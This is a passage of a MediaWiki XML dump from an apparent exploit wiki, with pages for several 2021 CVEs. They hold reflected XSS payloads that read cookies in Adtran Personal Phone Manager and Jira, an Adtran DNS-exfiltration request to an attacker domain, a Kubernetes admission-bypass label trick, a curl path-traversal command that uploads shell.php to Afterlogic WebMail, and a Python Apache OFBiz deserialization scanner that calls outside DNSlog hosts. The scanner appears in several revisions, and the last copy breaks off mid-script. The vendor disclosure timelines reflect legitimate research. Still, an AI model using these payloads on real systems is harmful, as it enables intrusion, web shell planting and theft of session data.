- 3/2/2021: The researcher acknowledges the approval and informs the product security team that a link will be provided to any future publications once the vulnerability is publicly disclosed.
- 3/3/2021: The researcher begins constructing a private repository to prepare the write ups for release.
- 4/17/2021: The researcher publishes the repository for full disclosure and notifies MITRE to update the CVE entry details.
            
&lt;/pre&gt;</text>
      <sha1>tfbcll5qwcufh0fkt22gmuov0vlk1fe</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25680 Adtran Personal Phone Manager 10.8.1 - 'Multiple' 反射型XSS漏洞</title>
    <ns>0</ns>
    <id>1476</id>
    <revision>
      <id>1853</id>
      <timestamp>2021-04-22T01:59:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Adtran Personal Phone Manager 10.8.1 - 'Multiple' Reflected Cross-Site Scripting (XSS)  # Date: 1/21/2021 # Exploit Author: 3ndG4me # Vendor Hom..."</comment>
      <origin>1853</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6180" sha1="lfkt6ao587a9eejaa88uqssrbltrrb6" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Adtran Personal Phone Manager 10.8.1 - 'Multiple' Reflected Cross-Site Scripting (XSS) 
# Date: 1/21/2021
# Exploit Author: 3ndG4me
# Vendor Homepage: https://adtran.com/web/page/portal/Adtran/wp_home
# Version: v10.8.1
# Tested on: NetVanta 7060 and NetVanta 7100
# CVE : CVE-2021-25680

# CVE-2021-25680 - Adtran Personal Phone Manager Multiple Reflected XSS

--Summary--

The AdTran Personal Phone Manager software is vulnerable to multiple reflected cross-site scripting (XSS) issues. These issues impact at minimum versions 10.8.1 and below but potentially impact later versions as well since they have not previously been disclosed. Only version 10.8.1 was able to be confirmed during primary research

ADTRAN, Inc
https://adtran.com

--Affects--

- AdTran Personal Phone Manager
- Verified on v10.8.1
- **Note**: The affected appliances NetVanta 7060 and NetVanta 7100 are considered End of Life and as such this issue will not be patched. It is recommended impacted users update to an actively supported appliance.

--Details--

The AdTran Personal Phone Manager software is vulnerable to multiple reflected cross-site scripting (XSS) issues. These issues impact at minimum versions 10.8.1 and below but potentially impact later versions as well since they have not previously been disclosed. Only version 10.8.1 was able to be confirmed during primary research. These issues work by passing in a basic XSS payload to vulnerable GET parameters that are reflected in the output without saniztization. This can allow for several issues including but not limited to:

- Hijacking a user's session
- Modifying a user's configuration settings
- Using XSS payloads to capture input (keylogging)


-- Proof of Concept --
The following URL parameters were impacted and can be exploited with the sample payloads provided below:
- https://example.com/userapp/userSettings.html?emailSuccessMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
- https://example.com/userapp/phoneSettings.html?successMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
- https://example.com/userapp/phoneSettingsAction.html?formAction=&amp;callForwardingFlag=1&amp;callForwardNumber=SOMEDATA"&gt;&lt;script&gt;alert`XSS`&lt;/script&gt;&amp;apply=Apply Changes
- https://example.com/userapp/directoriesAction.html?formAction=applySpeedDialChanges&amp;callEntryToDelete=&amp;newSpeedDialName(1)=&amp;newSpeedDialNumber(1)=&amp;newSpeedDialName(2)=&amp;newSpeedDialNumber(2)=&amp;newSpeedDialName(3)=&amp;newSpeedDialNumber(3)=&amp;newSpeedDialName(4)=&amp;newSpeedDialNumber(4)=&amp;newSpeedDialName(5)=&amp;newSpeedDialNumber(5)=&amp;newSpeedDialName(6)=&amp;newSpeedDialNumber(6)=&amp;newSpeedDialName(7)=&amp;newSpeedDialNumber(7)=&amp;newSpeedDialName(8)=&amp;newSpeedDialNumber(8)=&amp;newSpeedDialName(9)=&amp;newSpeedDialNumber(9)=&amp;newSpeedDialName(10)=&amp;newSpeedDialNumber(10)=&amp;newSpeedDialName(11)=&amp;newSpeedDialNumber(11)=&amp;newSpeedDialName(12)=&amp;newSpeedDialNumber(12)=SOMEDATA&lt;script&gt;alert`XSS`&lt;/script&gt;&amp;newSpeedDialName(13)=&amp;newSpeedDialNumber(13)=&amp;newSpeedDialName(14)=&amp;newSpeedDialNumber(14)=&amp;newSpeedDialName(15)=&amp;newSpeedDialNumber(15)=&amp;newSpeedDialName(16)=&amp;newSpeedDialNumber(16)=&amp;newSpeedDialName(17)=&amp;newSpeedDialNumber(17)=&amp;newSpeedDialName(18)=&amp;newSpeedDialNumber(18)=&amp;newSpeedDialName(19)=&amp;newSpeedDialNumber(19)=&amp;newSpeedDialName(20)=&amp;newSpeedDialNumber(20)=&amp;applySpeedDialChanges=Apply

The vulnerable parameters that were identified impact more pages than just the above. Any page that renders a response using the following parameters is impacted by this issue:
- emailSuccessMessage
- successMessage
- callForwardNumber
- newSpeedDialNumber(#)


--Mitigation--

Sanitize any user controlled input in both form fields and URL paramaters to properly encode data so it is not rendered as arbitrary HTML/JavaScript.

--Timeline--

- 1/21/2021: XSS Vulnerabilities were discovered and documented. A temporary CVE identifier was requested by MITRE. AdTran was also notified with the full details of each finding via their product security contact at https://adtran.com/web/page/portal/Adtran/wp_product_security. A baseline 90 day disclosure timeline was established in the initial communication.
- 1/22/2021: Placeholder CVE-2021-25680 was assigned by MITRE.
- 1/29/2021: A response from AdTran's Product Security Team was received.
- 2/8/2021: The researcher responded to the email acknowledging receipt. The encrypted email contents appeared to be corrupted so a request was made to resend the data.
- 2/9/2021: AdTran's Product Security Team replied with a re-encrypted copy of the previous communication made on 1/29/2021. The reasearcher was able to successfully decrypt the contents of this communication. The communication informed the researcher that the disclosed issues targeting NetVanta 7060 and NetVanta 7100 would not be addressed. The justification for this decision is that software support ended in June of 2018, and product EOL occurred in December of 2020. As such AdTran would not be invesitgating the issues leaving the details of the findings as is. The reseacher responded with acknowledgement to the decision and requested support to proceed with full disclosure outside of the previously established 90 day timeline.
- 2/11/2021: AdTran's product security team responded to the request for full disclosure. They informed the researcher that they would like to discuss the decision internally first. The researcher acknowledged the request and affirmed they would not procceed with disclosure until further notice.
- 3/1/2021: AdTran's product security team reached out to inform the researcher that they would support the full disclosure of the vulnerability at the researcher's discretion. They provided a few details on model names to include as EOL for the disclosure details.
- 3/2/2021: The researcher acknowledges the approval and informs the product security team that a link will be provided to any future publications once the vulnerability is publicly disclosed.
- 3/3/2021: The researcher begins constructing a private repository to prepare the write ups for release.
- 4/17/2021: The researcher publishes the repository for full disclosure and notifies MITRE to update the CVE entry details.
            
&lt;/pre&gt;</text>
      <sha1>lfkt6ao587a9eejaa88uqssrbltrrb6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25681 Adtran Personal Phone Manager 10.8.1 DNS數據泄漏漏洞</title>
    <ns>0</ns>
    <id>1477</id>
    <revision>
      <id>1854</id>
      <timestamp>2021-04-22T02:01:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Adtran Personal Phone Manager 10.8.1 - DNS Exfiltration # Date: 1/21/2021 # Exploit Author: 3ndG4me # Vendor Homepage: https://adtran.com/web/pa..."</comment>
      <origin>1854</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4492" sha1="bece08vgleec73f57dc38ilvzebo1vh" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Adtran Personal Phone Manager 10.8.1 - DNS Exfiltration
# Date: 1/21/2021
# Exploit Author: 3ndG4me
# Vendor Homepage: https://adtran.com/web/page/portal/Adtran/wp_home
# Version: v10.8.1
# Tested on: NetVanta 7060 and NetVanta 7100
# CVE : CVE-2021-25681

# CVE-2021-25681 - AdTran Personal Phone Manager DNS Exfiltration 

--Summary--

The AdTran Personal Phone Manager software is vulnerable to an issue that allows for exfiltration of data over DNS. This could allow for exposed AdTran Personal Phone Manager web servers to be used as DNS redirectors to tunnel arbitrary data over DNS.

ADTRAN, Inc
https://adtran.com

--Affects--

- AdTran Personal Phone Manager
- Verified on v10.8.1
- **Note**: The affected appliances NetVanta 7060 and NetVanta 7100 are considered End of Life and as such this issue will not be patched. It is recommended impacted users update to an actively supported appliance.

--Details--

The AdTran Personal Phone Manager software is vulnerable to an issue that allows for exfiltration of data over DNS. This could allow for exposed AdTran Personal Phone Manager web servers to be used as DNS redirectors to tunnel arbitrary data over DNS. This is achieved by simply making a GET request to the vulnerable server containing a reference to a DNS target that is collecting the tunneled data. This can lead to:

- Utilizing exposed AdTran Personal Phone Manager Services as a redirector for DNS based Command and Control
- Utilizing exposed AdTran Personal Phone Manager Services as a redirector for DNS based arbitrary data exfiltration


-- Proof of Concept --
To exploit the issue all that is necessary is a simple DNS request:

GET http://mydns.attack.com/ HTTP/1.1
Host: SOME ADTRAN HOST HERE
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close

--Mitigation--
The server should be reconfigured to not perform arbitrary DNS lookups when the Host/Get requests do not match. Additionally scoping requests to only be allowed in the context of the application is ideal.

--Timeline--

- 1/21/2021: DNS Exfiltration vulnerability was discovered and documented. A temporary CVE identifier was requested by MITRE. AdTran was also notified with the full details of each finding via their product security contact at https://adtran.com/web/page/portal/Adtran/wp_product_security. A baseline 90 day disclosure timeline was established in the initial communication.
- 1/22/2021: Placeholder CVE-2021-25681 was assigned by MITRE.
- 1/29/2021: A response from AdTran's Product Security Team was received.
- 2/8/2021: The researcher responded to the email acknowledging receipt. The encrypted email contents appeared to be corrupted so a request was made to resend the data.
- 2/9/2021: AdTran's Product Security Team replied with a re-encrypted copy of the previous communication made on 1/29/2021. The reasearcher was able to successfully decrypt the contents of this communication. The communication informed the researcher that the disclosed issues targeting NetVanta 7060 and NetVanta 7100 would not be addressed. The justification for this decision is that software support ended in June of 2018, and product EOL occurred in December of 2020. As such AdTran would not be invesitgating the issues leaving the details of the findings as is. The reseacher responded with acknowledgement to the decision and requested support to proceed with full disclosure outside of the previously established 90 day timeline.
- 2/11/2021: AdTran's product security team responded to the request for full disclosure. They informed the researcher that they would like to discuss the decision internally first. The researcher acknowledged the request and affirmed they would not procceed with disclosure until further notice.
- 3/1/2021: AdTran's product security team reached out to inform the researcher that they would support the full disclosure of the vulnerability at the researcher's discretion. They provided a few details on model names to include as EOL for the disclosure details.
- 3/2/2021: The researcher acknowledges the approval and informs the product security team that a link will be provided to any future publications once the vulnerability is publicly disclosed.
- 3/3/2021: The researcher begins constructing a private repository to prepare the write ups for release.
- 4/17/2021: The researcher publishes the repository for full disclosure and notifies MITRE to update the CVE entry details.
            
&lt;/pre&gt;</text>
      <sha1>bece08vgleec73f57dc38ilvzebo1vh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-25735 Kubernetes 准入機制繞過漏洞</title>
    <ns>0</ns>
    <id>2543</id>
    <revision>
      <id>3040</id>
      <timestamp>2021-05-22T02:30:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; kube-apiserver v1.20.0 - v1.20.5 kube-apiserver v1.19.0 - v1.19.9 kube-apiserver &lt;= v1.18.17 &lt;/pre&gt;  ==漏洞利用== 通過執行組合操作將changeA..."</comment>
      <origin>3040</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="661" sha1="5voa4xjd45vxqkruca31198guk5zwo9" xml:space="preserve">==影響版本==
&lt;pre&gt;
kube-apiserver v1.20.0 - v1.20.5
kube-apiserver v1.19.0 - v1.19.9
kube-apiserver &lt;= v1.18.17
&lt;/pre&gt;

==漏洞利用==
通過執行組合操作將changeAllowed標籤更改為true並添加一個新標籤，觸發該漏洞，新的值已被准入控制器覆蓋：
&lt;pre&gt;
 labels:  
    test: test  
    changeAllowed: "true"
&lt;/pre&gt;

==參考==
https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass/

https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass/

https://github.com/darryk10/CVE-2021-25735

https://nvd.nist.gov/vuln/detail/CVE-2021-25735

https://cloud.google.com/kubernetes-engine/docs/security-bulletins</text>
      <sha1>5voa4xjd45vxqkruca31198guk5zwo9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26078 Atlassian Jira Server/Data Center 8.16.0 XSS漏洞</title>
    <ns>0</ns>
    <id>5257</id>
    <revision>
      <id>6018</id>
      <timestamp>2021-06-29T01:20:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Atlassian Jira Server/Data Center 8.16.0 - Reflected Cross-Site Scripting (XSS) # Date: 06/05/2021 # Exploit Author: CAPTAIN_HOOK # Vendor Homepage: htt..."</comment>
      <origin>6018</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1801" sha1="ow18v5etfubek4rcnyv625al10sj8c5" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Atlassian Jira Server/Data Center 8.16.0 - Reflected Cross-Site Scripting (XSS)
# Date: 06/05/2021
# Exploit Author: CAPTAIN_HOOK
# Vendor Homepage: https://www.atlassian.com/
# Software Link: https://www.atlassian.com/software/jira/download/data-center
# Version: versions &lt; 8.5.14, 8.6.0 ≤ version &lt;  8.13.6, 8.14.0 ≤ version &lt; 8.16.1
# Tested on: ANY
# CVE : CVE-2021-26078

Description: 								

The number range searcher component in Jira Server and Jira Data Center before version 8.5.14, from version 8.6.0 before version 8.13.6, and from version 8.14.0 before version 8.16.1 allows remote attackers inject arbitrary HTML or JavaScript via across site scripting (XSS) vulnerability
*Fixed versions:*

   - 8.5.14
   - 8.13.6	
   - 8.16.1	
   - 8.17.0

POC:

   - *Story points* custom field that exists by default in all JIRA Server has 3 types of Search template ( None , number range searcher, number searcher) By default the value of Search template is number range searcher OR number searcher. if the value of Search template was set on number range searcher the JIRA server is vulnerable to XSS attack by lowest privilege . For Testing Check the Story points custom field and it's details ( for verifying that the Search template sets on number range searcher) with your ADMIN account ( just like the images) and in the other window Type this With your least privilege
user : jql=issuetype%20%3D%20Epic%20AND%20%22Story%20Points%22%20%3C%3D%20%22%5C%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22%20AND%20%22Story%20Points%22%20%3E%3D%20%221%22
Your XSS Will be triggered immediately.

Reference:
https://jira.atlassian.com/browse/JRASERVER-72392?error=login_required&amp;error_description=Login+required&amp;state=9b05ec1f-587c-4014-9053-b6fdbb1efa21
&lt;/pre&gt;</text>
      <sha1>ow18v5etfubek4rcnyv625al10sj8c5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26293 Afterlogic Aurora &amp; WebMail Pro 文件上傳漏洞</title>
    <ns>0</ns>
    <id>2552</id>
    <revision>
      <id>3050</id>
      <timestamp>2021-05-22T02:48:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; WebMail Pro ≤ 7.7.9 Afterlogic Aurora ≤ 7.7.9 &lt;/pre&gt;  ==POC== &lt;pre&gt; curl -T shell.php -u 'caldav_public_user@localhost:caldav_public_user' "https://..."</comment>
      <origin>3050</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="746" sha1="83yjm7kzj8vm7qhb2tan03jt07f0ro0" xml:space="preserve">==影響版本==
&lt;pre&gt;
WebMail Pro ≤ 7.7.9
Afterlogic Aurora ≤ 7.7.9
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -T shell.php -u 'caldav_public_user@localhost:caldav_public_user' "https://sample-mail.tld/dav/server.php/files/persona/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e/var/www/html/shell.php"
&lt;/pre&gt;

默認路徑為/var/www/html，也可能更改配置為其它路徑，可以嘗試其它方式獲取。
&lt;pre&gt;
curl -X DELETE -u 'caldav_public_user@localhost:caldav_public_user' "https://sample-mail.tld/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"
&lt;/pre&gt;</text>
      <sha1>83yjm7kzj8vm7qhb2tan03jt07f0ro0</sha1>
    </revision>
    <revision>
      <id>3051</id>
      <parentid>3050</parentid>
      <timestamp>2021-05-22T02:48:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* POC */</comment>
      <origin>3051</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="469" sha1="2q7uqikzwpesjmt1hccldrw4wgfklqk" xml:space="preserve">==影響版本==
&lt;pre&gt;
WebMail Pro ≤ 7.7.9
Afterlogic Aurora ≤ 7.7.9
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -T shell.php -u 'caldav_public_user@localhost:caldav_public_user' "https://sample-mail.tld/dav/server.php/files/persona/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e/var/www/html/shell.php"
&lt;/pre&gt;</text>
      <sha1>2q7uqikzwpesjmt1hccldrw4wgfklqk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞</title>
    <ns>0</ns>
    <id>446</id>
    <revision>
      <id>642</id>
      <timestamp>2021-03-24T02:31:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt;  Apache OFBiz &lt; 17.12.06   ==POC== &lt;pre&gt; import requests import sys import sys import subprocess import binascii from r..."</comment>
      <origin>642</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2279" sha1="j9y7htxfnn5kt6ij0fv0pmj9w2gfta0" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
import requests
import sys
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion: Apache OFBiz                                            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def POC_1(target_url, Dnslog):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", Dnslog], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"&gt;&lt;peiqi:cus-obj&gt;%s&lt;/peiqi:cus-obj&gt;&lt;/peiqi:clearAllEntityCaches&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;''' % hex_data
    vuln_url = target_url + "/webtools/control/SOAPService"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[36m[o] 请检查 Dnslog 响应\n \033[0m")
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;</text>
      <sha1>j9y7htxfnn5kt6ij0fv0pmj9w2gfta0</sha1>
    </revision>
    <revision>
      <id>643</id>
      <parentid>642</parentid>
      <timestamp>2021-03-24T02:31:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>643</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2290" sha1="le10i4oecmxlou7q9nmlua308cavws6" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
import requests
import sys
import sys
import subprocess
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion: Apache OFBiz                                            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def trans(s):
    return "%s" % ''.join('%.2x' % x for x in s)

def POC_1(target_url, Dnslog):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", Dnslog], stdout=subprocess.PIPE)
    data = popen.stdout.read()
    hex_data = trans(data)
    headers = {
        'Content-Type': 'text/xml'
    }
    post_data = '''&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;peiqi:clearAllEntityCaches xmlns:peiqi="http://ofbiz.apache.org/service/"&gt;&lt;peiqi:cus-obj&gt;%s&lt;/peiqi:cus-obj&gt;&lt;/peiqi:clearAllEntityCaches&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;''' % hex_data
    vuln_url = target_url + "/webtools/control/SOAPService"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \033[0m".format(target_url))
        if response.status_code == 200:
            print("\033[36m[o] 请检查 Dnslog 响应\n \033[0m")
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;</text>
      <sha1>le10i4oecmxlou7q9nmlua308cavws6</sha1>
    </revision>
    <revision>
      <id>646</id>
      <parentid>643</parentid>
      <timestamp>2021-03-24T07:11:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>646</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2293" sha1="t97wkm537ykdy8uptswhrghg4ko74uz" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>t97wkm537ykdy8uptswhrghg4ko74uz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞/en</title>
    <ns>0</ns>
    <id>4075</id>
    <revision>
      <id>4692</id>
      <timestamp>2021-06-10T03:17:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Vulnerability Impact=="</comment>
      <origin>4692</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2265" sha1="31l96crdy8vje960f7yrfcf8bfcnt3x" xml:space="preserve">&lt;languages /&gt;
==Vulnerability Impact==

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>31l96crdy8vje960f7yrfcf8bfcnt3x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞/es</title>
    <ns>0</ns>
    <id>4091</id>
    <revision>
      <id>4709</id>
      <timestamp>2021-06-10T04:05:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Impacto de la vulnerabilidad =="</comment>
      <origin>4709</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2275" sha1="2t0hvl6phbzva12qp6gleri1sy9q459" xml:space="preserve">&lt;languages /&gt;
== Impacto de la vulnerabilidad ==

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
